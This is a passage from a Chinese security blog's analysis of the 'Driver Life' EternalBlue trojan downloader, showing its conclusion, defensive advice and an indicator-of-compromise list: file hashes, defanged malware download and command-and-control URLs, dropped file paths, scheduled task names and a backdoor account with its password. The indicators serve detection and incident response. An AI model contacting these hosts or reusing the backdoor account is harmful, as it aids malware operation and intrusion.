+<p>​    “永恒之蓝木马下载器”病毒另一个需要关注的点在于其模块化的攻击手段，作者甚至可以将较新的漏洞嵌入到病毒的整个传播流程中。由此可见该病毒的整个架构已经较为成熟，安全运维人员在处置最新的漏洞时弱反应较慢，此病毒很容易在内网中形成传播的趋势。</p>
+<h1 id="5-安全建议"><a href="#5-安全建议" class="headerlink" title="5. 安全建议"></a>5. 安全建议</h1><ol>
+<li>安装杀毒软件对病毒进行预防和查杀。</li>
+<li>关闭不必要的端口，包括但不限于135、139、445、3389等。</li>
+<li>修改默认密码，使用强度较高的密码，做到定期更新，一机一码。</li>
+<li>对于相关的漏洞，如永恒之蓝系列漏洞、CVE-2017-8464 、CVE-2017-8570、CVE-2019-0708、CVE-2020-0796。</li>
+<li>提高员工的安全意识，做到定期科普。</li>
+</ol>
+<h1 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h1><p><strong>MD5</strong>：</p>
+<p>def0e980d7c2a59b52d0c644a6e40763</p>
+<p>f79cb9d2893b254cc75dfb7f3e454a69</p>
+<p>74e2a43b2b7c6e258b3a3fc2516c1235</p>
+<p>2e9710a4b9cba3cd11e977af87570e3b</p>
+<p>def0e980d7c2a59b52d0c644a6e40763</p>
+<p>95adf923ba32cc5004277867181680c8</p>
+<p>31ce6662be59ca4c01c1730bc7150f19</p>
+<p>e05827e44d487d1782a32386123193ef</p>
+<p>55f0dd8c306db9fc8b9e45705cd66598</p>
+<p>c17cdee1afdc272a46b1cf25c1f44dcc</p>
+<p>24c4149468926bedcb41f50ac88b40f3</p>
+<p>4ec29049ac81521c37dad2da6754d6a3</p>
+<p>888dc1ca4b18a3d424498244acf81f7d</p>
+<p>3162e619f8eb49f4dd6b48cb09075e10</p>
+<p>94838EDD7470271386153D3B89FE6A6C    </p>
+<p>e561003b347f391eec44759de1da5ebf</p>
+<p>ff75c064248579f4bdabec6d6dba89d6</p>
+<p>2ae7f2f4f0b114ed074ba191acf1665a</p>
+<p>ef3a4697773f84850fe1a086db8edfe0</p>
+<p><strong>URL</strong>：</p>
+<p>hxxp://pull[.]update[.]ackng[.]com/</p>
+<p>hxxp://dl[.]haqo[.]net/</p>
+<p>hxxp://i[.]haqo.net/i.png</p>
+<p>hxxp://p[.]abbny.com/im.png</p>
+<p>hxxp://v[.]beahh.com/v+$env:USERDOMAIN</p>
+<p>hxxp://w[.]beahh.com/page.html?p%COMPUTERNAME%</p>
+<p>hxxp://v[.]beahh.com/ipc?low1</p>
+<p>hxxp://info[.]haqo.net/e.png?</p>
+<p>hxxp://info[.]beahh.com/e.png?</p>
+<p>hxxp://info[.]abbny.com/e.png?</p>
+<p>hxxp://d[.]beahh.com/update.png?p=11</p>
+<p>hxxp://172[.]104.177.202/new.json?11</p>
+<p>hxxp://172[.]104.177.202/new.dat?11</p>
+<p>hxxp://v[.]y6h.net/g?</p>
+<p>hxxp://down[.]beahh.com/new.dat?allv5</p>
+<p>hxxp://down[.]beahh.com/mn.dat?allv5</p>
+<p>hxxp://p[.]beahh.com/upgrade.php?ver=5&amp;mac=</p>
+<p>hxxp://t.zz3r0[.]com/a.jsp?</p>
+<p>hxxp://t.zer9g[.].com/a.jsp?</p>
+<p>hxxp://t.amynx[.]com/a.jsp?</p>
+<p>hxxp://t.amynx[.]com /ms.jsp?</p>
+<p>hxxp://t.amynx[.]com /mso.jsp?</p>
+<p>hxxp://t.amynx[.]com /7p.php?</p>
+<p>hxxp://t.amynx[.]com /usb.php?</p>
+<p>hxxp://t.amynx[.]com /ln/core.png?</p>
+<p>hxxp://t.amynx[.]com /smgh.jsp?</p>
+<p>hxxp://t.amynx[.]com /rdp.jsp</p>
+<p>hxxp://t.amynx[.]com/ipc.jsp</p>
+<p>hxxp://d.ackng[.]com/if.bin?</p>
+<p>hxxp://d.ackng[.]com/nvd.zip</p>
+<p>hxxp://d.ackng[.]com/if_mail.bin?</p>
+<p><strong>Domain</strong>：</p>
+<p>pull[.]update[.]ackng[.]com</p>
+<p>dl[.]haqo[.]net</p>
+<p>i[.]haqo.net    </p>
+<p>p[.]abbny.com</p>
+<p>v[.]beahh.com</p>
+<p>w[.]beahh.com</p>
+<p>info[.]haqo.net</p>
+<p>info[.]beahh.com</p>
+<p>info[.]abbny.com</p>
+<p>d[.]beahh.com</p>
+<p>down[.]beahh.com</p>
+<p>p[.]beahh.com</p>
+<p>t[.]zz3r0.com</p>
+<p>t[.]zer9g.com</p>
+<p>t[.]amynx.com</p>
+<p>t[.]ackng.com</p>
+<p><strong>文件</strong>：</p>
+<p>c:\windows\temp\updater.exe</p>
+<p>c:\windows\system32\svhost.exe</p>
+<p>c:\windows\system32\drivers\svchost.exe</p>
+<p>c:\windows\system32\drivers\taskmgr.exe</p>
+<p>c:\windows\system32\wmiex.exe</p>
+<p>c:\windows\temp\svchost</p>
+<p>c:\windows\temp\m2.ps1</p>
+<p>c:\windows\temp\mkatz.ini</p>
+<p><strong>注</strong>：在64位系统中c:\windows\system32替换为c\windows\SysWOW64</p>
+<p><strong>计划任务</strong>：</p>
+<p>svhost、server、Ddrivers、WebServers、Credentials、DnsScan、Bluetooths、00-00-00-00-00-00(MAC地址命名)、blackball、Rtsa2、Rtsa1、Rtsa、bluetea</p>
+<p><strong>重点关注账户：</strong></p>
+<p>Name：k8h3d</p>
+<p>Password：k8d3j9SjfS7</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:hskull00@outlook.com">hskull</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/03/06/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E8%B0%88%E4%B8%80%E8%B0%88%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F%E6%9C%A8%E9%A9%AC/">http://example.com/2021/03/06/样本分析/谈一谈驱动人生木马/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="http://hskull.cn/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">hskull</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/">样本分析</a><a class="post-meta__tags" href="/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/">永恒之蓝</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hskull00/Images/样本分析/驱动人生v2-655f91de80d1ad2249fcd7579f573c21_ipico.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/08/11/pwnable/pwnable.kr%E7%B3%BB%E5%88%9701-fd/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnablepwn3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">pwnable.kr系列刷题之01-fd</div></div></a></div><div class="next-post pull-right"><a href="/2021/01/01/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-01/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/hskull00/Images/博客相关/20210101181703.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">如何分析各种类型的恶意样本之--C#恶意样本分析技巧</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/01/样本分析/恶意样本分析-01/" title="如何分析各种类型的恶意样本之--C#恶意样本分析技巧"><img class="cover" src="https://cdn.jsdelivr.net/gh/hskull00/Images/博客相关/20210101181703.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-01</div><div class="title">如何分析各种类型的恶意样本之--C#恶意样本分析技巧</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/hskull00/Images/博客相关/20201231224217.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">hskull</div><div class="author-info__description">格物致知 诚意正心 修身齐家</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/hskull00"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客，我将带你走进网络安全的世界</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">1. 概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#00-%E6%97%B6%E9%97%B4%E7%BA%BF%E6%A2%B3%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">00 时间线梳理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E6%9C%80%E5%88%9D%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 最初的攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#00-%E6%9C%A8%E9%A9%AC%E4%B8%BB%E4%BD%93%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">00 木马主体分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#01-%E8%BF%9C%E6%8E%A7%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">01 远控模块分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E4%BC%A0%E6%92%AD%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">02 永恒之蓝传播模块分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%90%91%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E8%BD%AC%E5%8F%98"><span class="toc-number">3.</span> <span class="toc-text">3. 向无文件攻击方式转变</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#00-%E6%96%B0%E4%BC%A0%E6%92%AD%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text">00 新传播模块分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#01-%E5%85%A5%E4%BE%B5%E4%B9%8B%E5%90%8E%E7%9A%84%E5%90%8E%E7%BB%AD%E6%94%BB%E5%87%BB-%E5%89%8D%E7%BD%AE%E5%87%86%E5%A4%87"><span class="toc-number">3.2.</span> <span class="toc-text">01 入侵之后的后续攻击-前置准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-%E5%85%A5%E4%BE%B5%E4%B9%8B%E5%90%8E%E7%9A%84%E5%90%8E%E7%BB%AD%E6%94%BB%E5%87%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E6%8C%96%E7%9F%BF"><span class="toc-number">3.3.</span> <span class="toc-text">02 入侵之后的后续攻击-无文件挖矿</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-%E5%85%A5%E4%BE%B5%E4%B9%8B%E5%90%8E%E7%9A%84%E5%90%8E%E7%BB%AD%E6%94%BB%E5%87%BB-%E4%BC%A0%E6%92%AD%E6%A8%A1%E5%9D%97"><span class="toc-number">3.4.</span> <span class="toc-text">03 入侵之后的后续攻击-传播模块</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E4%B8%8D%E6%96%AD%E6%9B%B4%E6%96%B0%E7%9A%84%E6%94%BB%E5%87%BB%E7%BB%84%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">4. 不断更新的攻击组件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#00-%E5%86%8D%E6%AC%A1%E5%8F%98%E5%8C%96%E7%9A%84%E4%BC%A0%E6%92%AD%E6%96%B9%E5%BC%8F%E5%88%86%E6%9E%90"><span class="toc-number">4.1.</span> <span class="toc-text">00 再次变化的传播方式分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#01-%E6%96%B0%E7%9A%84%E6%94%BB%E5%87%BB%E5%89%8D%E5%87%86%E5%A4%87%E6%A8%A1%E5%9D%97a-jsp"><span class="toc-number">4.2.</span> <span class="toc-text">01 新的攻击前准备模块a.jsp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%96%B0%E6%B7%BB%E5%8A%A0%E7%BB%84%E4%BB%B6%E8%AF%B4%E6%98%8E"><span class="toc-number">4.3.</span> <span class="toc-text">02 无文件攻击新添加组件说明</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">4. 总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%AE"><span class="toc-number">6.</span> <span class="toc-text">5. 安全建议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IOCs"><span class="toc-number">7.</span> <span class="toc-text">IOCs</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/09/24/pwnable/pwnable.kr%E7%B3%BB%E5%88%9715-cmd2/" title="pwnable.kr系列刷题之15-cmd2"><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnablepwn3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnable.kr系列刷题之15-cmd2"/></a><div class="content"><a class="title" href="/2021/09/24/pwnable/pwnable.kr%E7%B3%BB%E5%88%9715-cmd2/" title="pwnable.kr系列刷题之15-cmd2">pwnable.kr系列刷题之15-cmd2</a><time datetime="2021-09-23T16:00:00.000Z" title="发表于 2021-09-24 00:00:00">2021-09-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/23/pwnable/pwnable.kr%E7%B3%BB%E5%88%9714-cmd1/" title="pwnable.kr系列刷题之14-cmd1"><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnablepwn3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnable.kr系列刷题之14-cmd1"/></a><div class="content"><a class="title" href="/2021/09/23/pwnable/pwnable.kr%E7%B3%BB%E5%88%9714-cmd1/" title="pwnable.kr系列刷题之14-cmd1">pwnable.kr系列刷题之14-cmd1</a><time datetime="2021-09-22T16:00:00.000Z" title="发表于 2021-09-23 00:00:00">2021-09-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/18/pwnable/pwnable.kr%E7%B3%BB%E5%88%9713-lotto/" title="pwnable.kr系列刷题之13-lotto"><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnablepwn3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnable.kr系列刷题之13-lotto"/></a><div class="content"><a class="title" href="/2021/09/18/pwnable/pwnable.kr%E7%B3%BB%E5%88%9713-lotto/" title="pwnable.kr系列刷题之13-lotto">pwnable.kr系列刷题之13-lotto</a><time datetime="2021-09-17T16:00:00.000Z" title="发表于 2021-09-18 00:00:00">2021-09-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/17/pwnable/pwnable.kr%E7%B3%BB%E5%88%9712-blackjack/" title="pwnable.kr系列刷题之12-blackjack"><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnablepwn3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnable.kr系列刷题之12-blackjack"/></a><div class="content"><a class="title" href="/2021/09/17/pwnable/pwnable.kr%E7%B3%BB%E5%88%9712-blackjack/" title="pwnable.kr系列刷题之12-blackjack">pwnable.kr系列刷题之12-blackjack</a><time datetime="2021-09-16T16:00:00.000Z" title="发表于 2021-09-17 00:00:00">2021-09-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/15/pwnable/pwnable.kr%E7%B3%BB%E5%88%9711-coin1/" title="pwnable.kr系列刷题之11-coin1"><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnablepwn3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnable.kr系列刷题之11-coin1"/></a><div class="content"><a class="title" href="/2021/09/15/pwnable/pwnable.kr%E7%B3%BB%E5%88%9711-coin1/" title="pwnable.kr系列刷题之11-coin1">pwnable.kr系列刷题之11-coin1</a><time datetime="2021-09-14T16:00:00.000Z" title="发表于 2021-09-15 00:00:00">2021-09-15</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/hskull00/Images/样本分析/驱动人生v2-655f91de80d1ad2249fcd7579f573c21_ipico.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By hskull</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script></div></body></html>
